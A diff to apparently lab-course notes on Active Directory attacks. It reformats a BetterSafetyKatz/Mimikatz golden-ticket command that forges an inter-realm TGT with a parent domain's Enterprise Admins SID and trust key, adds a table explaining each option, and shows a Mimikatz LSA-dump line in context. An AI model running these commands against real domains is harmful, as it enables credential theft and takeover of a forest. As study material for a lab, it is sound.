@@ -590,13 +590,24 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 
 
-- We can forge and inter-realm TGT:
+- We can then forge and inter-realm TGT:
 
 
 ```powershell
-C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-
-5-21-335606122-960912869-3279953914-519
-/rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt
-/target:moneycorp.local
-/ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
 ```
+
+
+|Option|Description|
+|---|---|
+|Kerberos::golden|The mimikatz module|
+|/domain|FQDN of the current domain|
+|/sid|SID of the current domain|
+|/sids|SID of the enterprise admins group of the parent domain|
+|/rc4|RC4 of the trust key|
+|/user|User to impersonate|
+|/service|Target service in the parent domain|
+|/target|FQDN of the parent domain|
+|/ticket|Path where the ticket is to be saved (e.g., C:\AD\Tools\trust_tkt.kirbi)|
+
+
